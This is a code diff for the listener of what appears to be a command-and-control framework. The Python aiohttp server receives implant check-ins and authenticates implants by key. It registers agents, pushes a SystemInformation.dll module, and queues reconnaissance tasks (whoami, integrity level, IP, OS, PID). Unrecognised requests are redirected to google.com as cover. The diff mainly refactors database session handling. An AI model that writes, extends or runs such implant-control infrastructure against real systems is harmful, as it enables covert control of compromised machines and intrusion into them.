@@ -5,16 +5,16 @@ import hashlib
 from aiohttp import web
 from connect.convert import string_to_base64, xor_base64
 from connect.output import display
-from connect.server.models import AgentModel, Session, ImplantModel, TaskModel
+from connect.server.models import AgentModel, get_session, ImplantModel, TaskModel
 
 
 class ListenerRoutes:
 
-    def __init__(self, aiohttp_app, sio_client, task_manager, session):
-        self.session = session
+    def __init__(self, aiohttp_app, sio_client, task_manager):
+        self.sio_client = sio_client
         self.aiohttp_app = aiohttp_app
-        #self.aiohttp_app.router.add_get('/{tail:.*}', self.dummy_route)
-        self.aiohttp_app.router.add_post('/{tail:.*}', self.check_in)
+        self.aiohttp_app.router.add_get(r'/{route:[^\/socket.io\/].*}', self.dummy_route)
+        self.aiohttp_app.router.add_post('/{route:.*}', self.check_in)
         self.task_manager = task_manager
 
     @staticmethod
@@ -31,20 +31,18 @@ class ListenerRoutes:
             #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
             return web.HTTPFound("https://www.google.com")
 
-        if isinstance(batch_response, dict):
-            display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
-            session = Session()
-            implant = session.query(ImplantModel).filter_by(key=batch_response['id']).first()
-            session.close()
-            if not implant:
-                display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
-                return web.HTTPFound("https://www.google.com")
-            return web.Response(text=self.create_agent(implant))
+        with get_session() as session:
+            if isinstance(batch_response, dict):
+                display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
+                implant = session.query(ImplantModel).filter_by(key=batch_response['id']).first()
+                if not implant:
+                    display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
+                    return web.HTTPFound("https://www.google.com")
+                return web.Response(text=self.create_agent(implant, session))
+            batch_request = self.task_manager.parse_batch_response(batch_response)
+            return web.json_response(batch_request)
 
-        batch_request = self.task_manager.parse_batch_response(batch_response)
-        return web.json_response(batch_request)
-
-    def create_agent(self, implant):
+    def create_agent(self, implant, session):
         agent = AgentModel(implant=implant)
         module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
         module_md5 = hashlib.md5(module_bytes).hexdigest()
@@ -58,7 +56,8 @@ class ListenerRoutes:
         ip_task = TaskModel(agent=agent, method='ip', type=-1, parameters='', misc='')
         os_task = TaskModel(agent=agent, method='os', type=-1, parameters='', misc='')
         pid_task = TaskModel(agent=agent, method='pid', type=-1, parameters='', misc='')
-        self.session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
-        self.session.commit()
-        display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
+        session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
+        session.commit()
+        self.sio_client.emit('proxy', json.dumps(['information', f'Created agent {agent.id} sending it to implant {implant.id}']))
+        session.close()
         return str(agent.check_in_task_id)
